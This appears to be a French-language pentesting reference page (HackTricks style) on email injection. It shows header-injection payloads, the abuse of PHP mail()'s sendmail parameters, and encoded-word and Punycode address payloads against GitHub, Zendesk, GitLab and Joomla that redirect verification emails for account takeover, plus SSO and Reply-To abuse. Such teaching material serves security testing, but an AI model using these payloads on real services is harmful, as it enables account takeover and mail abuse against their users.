# Injections d'e-mail

{{#include ../banners/hacktricks-training.md}}

## Injecter dans l'e-mail envoy√©

### Injecter Cc et Bcc apr√®s l'argument exp√©diteur
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Le message sera envoy√© aux comptes recipient et recipient1.

### Injecter un argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Le message sera envoy√© au destinataire d'origine et au compte de l'attaquant.

### Injecter l'argument Sujet
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
Le faux sujet sera ajout√© au sujet original et dans certains cas le remplacera. Cela d√©pend du comportement du service de messagerie.

### Modifier le corps du message

Injectez un saut de ligne de deux lignes, puis √©crivez votre message pour modifier le corps du message.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Exploitation de la fonction mail() de PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Le 5√®me param√®tre ($additional_parameters)

Cette section va se baser sur **comment abuser de ce param√®tre en supposant qu'un attaquant le contr√¥le**.

Ce param√®tre va √™tre ajout√© √† la ligne de commande que PHP utilisera pour invoquer le binaire sendmail. Cependant, il sera assaini avec la fonction `escapeshellcmd($additional_parameters)`.

Un attaquant peut **injecter des param√®tres extraits pour sendmail** dans ce cas.

#### Diff√©rences dans l'impl√©mentation de /usr/sbin/sendmail

L'interface **sendmail** est **fournie par le logiciel MTA de messagerie** (Sendmail, Postfix, Exim, etc.) install√© sur le syst√®me. Bien que la **fonctionnalit√© de base** (comme les param√®tres -t -i -f) reste la **m√™me** pour des raisons de compatibilit√©, **d'autres fonctions et param√®tres** varient consid√©rablement en fonction du MTA install√©.

Voici quelques exemples de diff√©rentes pages de manuel de la commande/interface sendmail :

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

Selon l'**origine du binaire sendmail**, diff√©rentes options ont √©t√© d√©couvertes pour les abuser et **fuiter des fichiers ou m√™me ex√©cuter des commandes arbitraires**. V√©rifiez comment dans [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injecter dans le nom de l'e-mail

> [!CAUTION]
> Notez que si vous parvenez √† cr√©er un compte dans un service avec un nom de domaine arbitraire (comme Github, Gitlab, CloudFlare Zero trust...) et √† le v√©rifier en recevant l'e-mail de v√©rification √† votre adresse e-mail, vous pourriez √™tre en mesure d'acc√©der √† des emplacements sensibles de l'entreprise victime.

### Parties ignor√©es d'un e-mail

Les symboles : **+, -** et **{}** dans de rares occasions peuvent √™tre utilis√©s pour le marquage et sont ignor√©s par la plupart des serveurs de messagerie.

- Par exemple, john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Les commentaires entre parenth√®ses ()** au d√©but ou √† la fin seront √©galement ignor√©s.

- Par exemple, john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Contournement de la liste blanche

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Citations

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Vous pouvez √©galement utiliser des IP comme nom de domaine entre crochets :

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### Encodage des e-mails

Comme expliqu√© dans [**cette recherche**](https://portswigger.net/research/splitting-the-email-atom), les noms d'e-mail peuvent √©galement contenir des caract√®res encod√©s :

- **D√©passement de capacit√© PHP 256** : La fonction PHP `chr` continuera √† ajouter 256 √† un caract√®re jusqu'√† ce qu'il devienne positif, puis effectuera l'op√©ration `%256`.
- `String.fromCodePoint(0x10000 + 0x40) // êÅÄ ‚Üí @`

> [!TIP]
> Le but de cette astuce est de finir avec une injection comme `RCPT TO:<"collab@psres.net>collab"@example.com>`\
> qui enverra l'e-mail de v√©rification √† une adresse e-mail diff√©rente de celle attendue (introduisant ainsi une autre adresse e-mail dans le nom de l'e-mail et brisant la syntaxe lors de l'envoi de l'e-mail).

Diff√©rents encodages :
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#¬†iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 ‚Üí x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- Notez le `@` encod√© comme =40, le `>` encod√© comme `=3e` et `null` comme `=00`&#x20;
- Cela enverra l'email de v√©rification √† `collab@psres.net`
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- M√™me astuce qu'auparavant mais en ajoutant une citation r√©guli√®re au d√©but et une citation encod√©e `=22` avant le `@` encod√©, puis en commen√ßant et fermant des citations avant le prochain email pour corriger la syntaxe utilis√©e en interne par Zendesk
- Cela enverra l'email de v√©rification √† `collab@psres.net`
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- Notez l'utilisation du soulignement comme espace pour s√©parer l'adresse
- Cela enverra l'email de v√©rification √† `collab@psres.net`
- Punycode: En utilisant Punycode, il a √©t√© possible d'injecter une balise `<style` dans Joomla et de l'abuser pour voler le token CSRF via l'exfiltration CSS.

#### Tooling

- Il existe un **script Burp Suite Turbo Intruder** pour fuzz ces types de combinaisons afin d'essayer d'attaquer les formats d'email. Le script a d√©j√† des combinaisons potentiellement fonctionnelles.
- Il est √©galement possible d'utiliser [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) pour cr√©er une attaque de s√©paration d'email

### Other vulns

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## Third party SSO

### XSS

Certains services comme **github** ou **salesforce** vous permettent de cr√©er une **adresse email avec des payloads XSS dessus**. Si vous pouvez **utiliser ces fournisseurs pour vous connecter √† d'autres services** et que ces services **ne nettoient pas** correctement l'email, vous pourriez provoquer **XSS**.

### Account-Takeover

Si un **service SSO** vous permet de **cr√©er un compte sans v√©rifier l'adresse email donn√©e** (comme **salesforce**) et que vous pouvez ensuite utiliser ce compte pour **vous connecter √† un service diff√©rent** qui **fait confiance** √† salesforce, vous pourriez acc√©der √† n'importe quel compte.\
&#xNAN;_&#x4E;otez que salesforce indique si l'email donn√© a √©t√© v√©rifi√© ou non, mais l'application devrait donc prendre en compte cette information._

## Reply-To

Vous pouvez envoyer un email en utilisant _**From: company.com**_ et _**Replay-To: attacker.com**_ et si une **r√©ponse automatique** est envoy√©e parce que l'email a √©t√© envoy√© **depuis** une **adresse interne**, l'**attaquant** pourrait √™tre en mesure de **recevoir** cette **r√©ponse**.

## Hard Bounce Rate

Certains services, comme AWS, mettent en ≈ìuvre un seuil connu sous le nom de **Hard Bounce Rate**, g√©n√©ralement fix√© √† 10 %. C'est une m√©trique critique, surtout pour les services de livraison d'emails. Lorsque ce taux est d√©pass√©, le service, comme le service email d'AWS, peut √™tre suspendu ou bloqu√©.

Un **hard bounce** fait r√©f√©rence √† un **email** qui a √©t√© renvoy√© √† l'exp√©diteur parce que l'adresse du destinataire est invalide ou inexistante. Cela peut se produire pour diverses raisons, telles que l'**email** √©tant envoy√© √† une adresse inexistante, un domaine qui n'est pas r√©el, ou le refus du serveur destinataire d'accepter des **emails**.

Dans le contexte d'AWS, si vous envoyez 1000 emails et que 100 d'entre eux entra√Ænent des hard bounces (en raison de raisons comme des adresses ou des domaines invalides), cela signifierait un taux de hard bounce de 10 %. Atteindre ou d√©passer ce taux peut d√©clencher AWS SES (Simple Email Service) pour bloquer ou suspendre vos capacit√©s d'envoi d'emails.

Il est crucial de maintenir un faible taux de hard bounce pour garantir un service email ininterrompu et maintenir la r√©putation de l'exp√©diteur. Surveiller et g√©rer la qualit√© des adresses email dans vos listes de diffusion peut grandement aider √† atteindre cet objectif.

Pour des informations plus d√©taill√©es, la documentation officielle d'AWS sur la gestion des rebonds et des plaintes peut √™tre consult√©e [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## References

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
